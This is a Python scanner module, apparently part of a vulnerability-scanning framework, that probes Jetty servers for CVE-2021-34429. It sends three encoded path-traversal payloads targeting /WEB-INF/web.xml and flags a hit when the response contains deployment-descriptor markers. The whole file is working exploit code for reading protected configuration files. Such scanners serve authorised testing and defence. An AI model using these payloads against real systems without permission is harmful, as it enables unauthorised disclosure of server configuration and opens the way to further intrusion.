#!/usr/bin/env python3
# -*- coding:utf-8 -*-

cve_2021_34429_payloads = [
    {'path': '%u002e/WEB-INF/web.xml'},
    {'path': '.%00/WEB-INF/web.xml'},
    {'path': '..%00/WEB-INF/web.xml'},
]

def cve_2021_34429_scan(clients):
    ''' CVE-2021-28164的变种和绕过
            基于 Unicode 的 URL 编码     /%u002e/WEB-INF/web.xml
            \0和 .                      /.%00/WEB-INF/web.xml
            \0和 ..                     /a/b/..%00/WEB-INF/web.xml
    '''
    hackClient = clients.get('hackClient')
    
    vul_info = {
        'app_name': 'Jetty',
        'vul_type': 'DSinfo',
        'vul_id': 'CVE-2021-34429',
    }

    for payload in cve_2021_34429_payloads:
        path = payload['path']

        res = hackClient.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('<web-app>' in res.text)
            and ('<display-name>' in res.text)
            and ('<!DOCTYPE web-app PUBLIC' in res.text)
            and ('Sun Microsystems' in res.text)
            and ('DTD Web Application' in res.text)
        ):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
